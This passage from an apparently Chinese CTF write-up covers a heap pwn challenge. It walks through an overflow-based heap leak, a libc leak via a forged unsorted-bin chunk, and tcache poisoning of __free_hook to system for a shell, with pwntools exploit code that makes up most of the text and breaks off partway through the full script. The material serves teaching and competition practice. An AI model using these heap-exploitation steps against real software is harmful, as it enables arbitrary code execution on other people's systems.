class=&#34;number&#34;&gt;0.1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;content: &amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;DEADBEEF&amp;#x27;&lt;/span&gt;)) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里就会造成溢出。先后释放 2，1，两个 chunk 进入 tcache，并且 1 对应的 chunk 的 fd 指针指向 2，chunk0 只有 0x20。我们输出 chunk0，一共输出 0x28 字节，将 chunk1 的 fd 指针泄露出来，就完成了堆地址的泄露。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;content: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recv(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_addr = u64(r.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(heap_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来，我们修改 chunk3 的头部，将其 size 从 0x21 改为 largebin 的大小范围，free (3) 令其进入 unsortedbins，我们在申请时，不要覆盖掉原本的 bk 指针就可以泄露出 libc 的地址。&lt;/p&gt;
&lt;p&gt;这里 free (3) 要绕过检查，所以我们将伪造他的下一个 chunk 的 size。先后释放 2,1, 使 chunk1 的 fd 指向 chunk2，利用 chunk0 的溢出，修改 chnnk1 的 fd，使其指向我们的目标地址。将伪造的 chunk3 的下一个堆的头写为合法的大小。同时这个伪造的 chunk 的下一堆的 size 也要合法，但是我们只能写 0x28 字节，所以我们将第一个伪造成 0x11，&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;new_add() &lt;span class=&#34;comment&#34;&gt;#1 0x370&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add() &lt;span class=&#34;comment&#34;&gt;#2 0x390&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x501&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aimed_addr = heap_addr+&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0x500&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;+p64(aimed_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add()       &lt;span class=&#34;comment&#34;&gt;#1  0x370&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add()    &lt;span class=&#34;comment&#34;&gt;#20x8a0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x11&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x11&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;现在 chunk3 就可以正常 free，绕过检查。我们从 unsortedbins 上申请一个 chunk，完成 libc 的泄露&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;content: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase = u64(r.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;0x3ec0d0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libcbase))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后面就是我们修改__free_hook 数据为 system 地址，触发 getshell&lt;/p&gt;
&lt;p&gt;同样的手法。chunk0 修改 chunk1 的 fd，只不过这次是先后释放 3，1，chunk1 原本指向 chunk3&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;system = libcbase+ libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free_hook = libcbase + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__free_hook&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;)+p64(free_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,p64(system))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;getflag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CDesktop%5Cciscn%5C%E5%8D%8A%E5%86%B3%E8%B5%9B%5C%E8%B5%9B%E9%A2%98%5C%E4%BA%8C%E8%BF%9B%E5%88%B6%5C1%5C1655218920143203%5CQQ%E5%9B%BE%E7%89%8720220618214051.png&#34; alt=&#34;QQ图片20220618214051&#34;&gt;&lt;/p&gt;
&lt;p&gt;完整 exp&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;dbg&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#r = process(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;172.16.9.42&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;8083&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./pwn&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./libc-2.27.so&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;sz,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;17&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;size: &amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(sz))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sleep(&lt;span class=&#34;number&#34;&gt;0.1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;content: &amp;#x27;&lt;/span&gt;,content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sleep(&lt;span class=&#34;number&#34;&gt;0.1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;addr: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    offset = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(r.recv(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; offset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;new_add&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;17&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sleep(&lt;span class=&#34;number&#34;&gt;0.1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;size: &amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sleep(&lt;span class=&#34;number&#34;&gt;0.1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;content: &amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;DEADBEEF&amp;#x27;&lt;/span&gt;)) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;68&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;idx: &amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;content: &amp;#x27;&lt;/span&gt;,content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;51&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;idx: &amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title 